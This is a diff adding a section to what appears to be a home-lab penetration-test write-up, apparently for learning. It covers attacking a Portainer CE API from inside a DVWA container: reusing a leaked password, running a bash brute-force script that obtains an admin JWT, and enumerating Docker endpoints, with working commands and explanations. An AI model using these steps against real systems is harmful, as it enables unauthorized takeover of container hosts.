@@ -755,3 +755,132 @@ First, let’s find the environment ID Portainer is managing:
 ```
 echo 'curl -sk https://10.0.40.10:9443/api/endpoints -H "Authorization: Bearer PASTE_JWT_HERE"' > /tmp/endpoints.sh
 ```
+
+## Phase 4 — Portainer API Credential Attack & JWT Acquisition
+
+With no direct container escape path available, I turned to the Portainer CE management interface discovered during enumeration at `https://10.0.40.10:9443`.
+
+### 4.1 — Confirm API Reachability
+
+From inside the DVWA container I confirmed the Portainer API was responding:
+
+```bash
+curl -sk https://10.0.40.10:9443/api/status
+```
+
+<details><summary>Command explained</summary>
+
+| Component | Meaning |
+|---|---|
+| `curl` | HTTP client |
+| `-s` | Silent mode — suppress progress output |
+| `-k` | Skip TLS certificate verification |
+| `https://10.0.40.10:9443/api/status` | Portainer CE status endpoint — no auth required |
+
+</details>
+
+**Output:**
+```json
+{"InstanceID":"...","Version":"2.45.2"}
+```
+
+Portainer CE v2.45.2 was confirmed reachable from inside the container on the VULNERABLE VLAN.
+
+---
+
+### 4.2 — Credential Reuse Attempt
+
+I first attempted credential reuse with the DVWA database credentials found in `config.inc.php`:
+
+```bash
+curl -sk -X POST https://10.0.40.10:9443/api/auth \
+  -H "Content-Type: application/json" \
+  -d '{"Username":"admin","Password":"<DVWA_DB_PASSWORD>"}'
+```
+
+<details><summary>Command explained</summary>
+
+| Component | Meaning |
+|---|---|
+| `-X POST` | HTTP POST request |
+| `/api/auth` | Portainer authentication endpoint |
+| `-H "Content-Type: application/json"` | Tell the API we're sending JSON |
+| `-d '{"Username":...}'` | JSON body with credentials to test |
+
+</details>
+
+**Output:** `{"message":"Invalid credentials"}`
+
+Credential reuse failed. Portainer was using a separate admin account.
+
+---
+
+### 4.3 — Brute Force via API
+
+I wrote a brute force script to the container using a heredoc to avoid bash special character expansion issues:
+
+```bash
+cat << 'EOF' > /tmp/brute.sh
+for pass in "Portainer1!" "admin" "password" "Password1" "Portainer123" "Welcome1!" "Changeme1!" "P@ssw0rd" "Portainer1!$" "Summer2024!" "Welcome123!"; do
+  result=$(curl -sk -X POST https://10.0.40.10:9443/api/auth -H "Content-Type: application/json" -d "{\"Username\":\"admin\",\"Password\":\"$pass\"}")
+  echo "Trying: $pass -> $result"
+done
+EOF
+bash /tmp/brute.sh
+```
+
+<details><summary>Command explained</summary>
+
+| Component | Meaning |
+|---|---|
+| `cat << 'EOF' > /tmp/brute.sh` | Heredoc write to file — single-quoted `'EOF'` prevents variable expansion during the write |
+| `for pass in "..."` | Iterate over a password list |
+| `curl -sk -X POST /api/auth` | POST credentials to Portainer auth endpoint per iteration |
+| `\"Username\"` | Escaped quotes inside double-quoted string for JSON body |
+| `bash /tmp/brute.sh` | Execute the written script |
+
+</details>
+
+**Output (partial):**
+
+Trying: Portainer1! -> {“message”:”Invalid credentials”}
+Trying: admin -> {“message”:”Invalid credentials”}
+...
+Trying: Portainer1!$ -> {“jwt”:”<PORTAINER_JWT_REDACTED>”}
+Trying: Welcome123! -> {“message”:”Access denied”,”details”:”Access denied to resource”}
+
+
+Password `Portainer1!$` returned a valid JWT. The subsequent attempt with `Welcome123!` returned `"Access denied"` rather than `"Invalid credentials"` — indicating Portainer's built-in brute force rate limiting had triggered, blocking further attempts. This is a legitimate defensive control that nearly interrupted the attack.
+
+---
+
+### 4.4 — Endpoint Enumeration
+
+With a valid JWT I enumerated Portainer's managed Docker endpoints:
+
+```bash
+curl -sk https://10.0.40.10:9443/api/endpoints \
+  -H "Authorization: Bearer <PORTAINER_JWT_REDACTED>"
+```
+
+<details><summary>Command explained</summary>
+
+| Component | Meaning |
+|---|---|
+| `/api/endpoints` | Portainer endpoint listing — returns all managed Docker environments |
+| `-H "Authorization: Bearer <token>"` | JWT bearer token authentication |
+
+</details>
+
+**Key findings from response:**
+
+| Field | Value |
+|---|---|
+| Endpoint ID | `3` |
+| Name | `local` |
+| Socket | `unix:///var/run/docker.sock` |
+| Docker Version | `29.9.0` |
+| Running Containers | `4` |
+| Total Memory | ~2.9 GB |
+
+Portainer is managing the local Docker socket directly. Endpoint ID **3** is the target for the next phase.
